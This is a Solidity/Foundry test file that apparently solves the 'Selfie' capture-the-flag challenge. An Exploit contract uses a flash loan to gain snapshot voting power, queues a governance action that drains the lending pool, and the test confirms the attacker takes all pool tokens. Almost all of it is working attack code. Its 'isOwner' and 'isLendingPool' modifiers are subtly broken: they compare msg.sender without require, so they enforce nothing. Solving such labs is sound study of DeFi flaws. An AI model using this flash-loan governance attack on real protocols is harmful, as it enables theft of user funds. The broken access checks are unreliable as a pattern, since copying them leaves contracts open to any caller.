// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Exploit {
    event GotHere();

    address internal immutable owner;
    address internal immutable poolAddress;

    DamnValuableTokenSnapshot internal immutable dvt;
    SimpleGovernance internal immutable govContract;
    SelfiePool internal immutable lendingPool;

    uint256 public actionId;

    constructor(
        address govAddress_,
        address poolAddress_,
        address tokenAddress_
    ) {
        owner = msg.sender;
        poolAddress = poolAddress_;

        dvt = DamnValuableTokenSnapshot(tokenAddress_);
        govContract = SimpleGovernance(govAddress_);
        lendingPool = SelfiePool(poolAddress_);

        actionId = type(uint256).max;
    }

    modifier isOwner() {
        msg.sender == owner;
        _;
    }

    modifier isLendingPool() {
        msg.sender == address(lendingPool);
        _;
    }

    function startExploit(uint256 loanAmount) public isOwner {
        // Get a flash loan, which will trigger receiveTokens()
        lendingPool.flashLoan(loanAmount);
    }

    function receiveTokens(
        address, /*tokenAddress*/
        uint256 amount
    ) public isLendingPool {
        // 1. Manually invoke snapshot to ensure value of token is fixed
        dvt.snapshot();

        // 2. Create action to be executed by governance sc
        bytes memory dataOfSelfiePoolDrain = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );

        // 3. Enqueue action on the governance sc
        actionId = govContract.queueAction(
            address(lendingPool),
            dataOfSelfiePoolDrain,
            0
        );

        emit GotHere();

        // 4. Pay back flash loan
        dvt.transfer(address(lendingPool), amount);
    }
}

contract Selfie is Test {
    uint256 private constant ACTION_DELAY_IN_SECONDS = 2 days;

    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        // The governance contract checks that the amount owned by msg.sender at the last snapshot
        // is > 50%. But I'm pretty sure that snapshot gets updated every time a transfer occurs.
        // This should mean that within the flashloanReceiver function, we will have the snapshot
        // updated such that the proposer has enough voting power.
        vm.startPrank(attacker);
        Exploit exploit = new Exploit(
            address(simpleGovernance),
            address(selfiePool),
            address(dvtSnapshot)
        );
        vm.label(address(exploit), "Exploit");

        exploit.startExploit(TOKENS_IN_POOL); // make an action to drainAllFunds

        uint256 actionId = exploit.actionId();

        require(actionId != type(uint256).max, "actionId not initialized.");

        // Wait ACTION_DELAY_IN_SECONDS to execute governance action
        vm.warp(block.timestamp + ACTION_DELAY_IN_SECONDS);

        simpleGovernance.executeAction(actionId);

        vm.stopPrank();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
